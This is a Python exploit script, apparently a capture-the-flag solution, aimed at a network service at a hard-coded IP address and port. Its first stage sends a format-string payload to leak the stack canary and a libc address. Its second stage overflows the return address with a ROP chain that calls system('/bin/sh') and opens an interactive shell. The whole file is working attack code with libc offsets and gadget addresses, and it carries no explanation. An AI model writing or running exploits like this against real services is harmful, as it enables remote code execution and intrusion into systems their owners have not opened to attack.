from pwnpwnpwn import *
import re
import time
import sys 

#host = "10.211.55.16"
host = "87.107.123.3"
port = 31337
#atoi = 0x39f50
name = 0x603108
atoi_got = 0x6030a8
atoi = 0x35220
#system = 0x46640
system = 0x3fc70
#binsh = 0x17ccdb
binsh = 0x14bc23
srand = 0xdbdbb1e
#ropgadget =  0xfa479
ropgadget = 0xdb959

def sendaddr(sock,addr,size = 8):
    addrlist = []
    for i in range(size):
        addrlist.append((addr >> i*8) & 0xff ) 
    for j in addrlist :
        recvuntil(sock,":")
        sendline(sock,str(j))

def answer(sock,ans):
    for i in ans:
        recvuntil(sock,":")
        sendline(sock,str(i))

sock = make_conn(host,port)

pat = r"b.*!"
pat2 = r"0x.*g"
pat3 = r"g.*t"
ans = [0x7c,0x22,0x4d,0xd0,0x44,0xdc,0x46,0xfa,0x3e,0x63,0xaa,0x42,0x11,0x3a,0x4d,0x0b]

print "Stage 1 (leak canary & libbase):"

recvuntil(sock,"How can I call you?")
sendline(sock,"%17$p" +"g"+ "%14$s"+"t" +"a"*51+"b") #create a fmt to leak canary & libc address

#leak seed
raw = recvuntil(sock,"it:")
match = re.search(pat,raw)
seed = match.group()
seed = seed[1:-1]
seed = seed.ljust(8,'\x00')
seed = unpack(seed)

assert ( seed > srand )

seed = seed - 0x0dbdbb1e
sendline(sock,str(-seed))
lucky = 0xffffffff -seed + 1
print "lucky number (v9) :%016x" %lucky

answer(sock,ans)

#set the input length (v8)
recvuntil(sock,":")
sendline(sock,str(0x30))

#align to lucky number
sendaddr(sock,0,3)
sendaddr(sock,lucky,4)

#align to fomat & overflow fomat with name
sendaddr(sock,0,8)
sendaddr(sock,atoi_got,8)
sendaddr(sock,name,8)


raw = recvuntil(sock,"?")
match = re.search(pat2,raw)
canary =  match.group()
canary = canary[:-1]
canary = int(canary,16)

match = re.search(pat3,raw)
libatoi = match.group()
libatoi = libatoi[1:-1]
libatoi = libatoi.ljust(8,'\x00')
libatoi = unpack(libatoi)
libbase = libatoi - atoi
print hex(libbase)

print "canary: %016x" % canary
print "libc address : %016x" % libbase

###overflow ret & ROP
print "Stage 2 (overflow ret) & rop"

sendline(sock,"y")

answer(sock,ans)

recvuntil(sock,":")
sendline(sock,str(112))

sendaddr(sock,0,3)
sendaddr(sock,lucky,4)

sendaddr(sock,0,16)
sendaddr(sock,atoi_got,8)
#align to canary & put canary
sendaddr(sock,0,8)
time.sleep(1)
sendaddr(sock,canary)

#align to ret
sendaddr(sock,0,24)

rop = libbase + ropgadget

#ROP : pop_rax,pop_rdi,call_rax
sendaddr(sock,rop)
sendaddr(sock,libbase+system)
sendaddr(sock,libbase+binsh)

#get shell
recvuntil(sock,"?")
sendline(sock,"n")
print "Finish and get the shell:"
inter(sock)
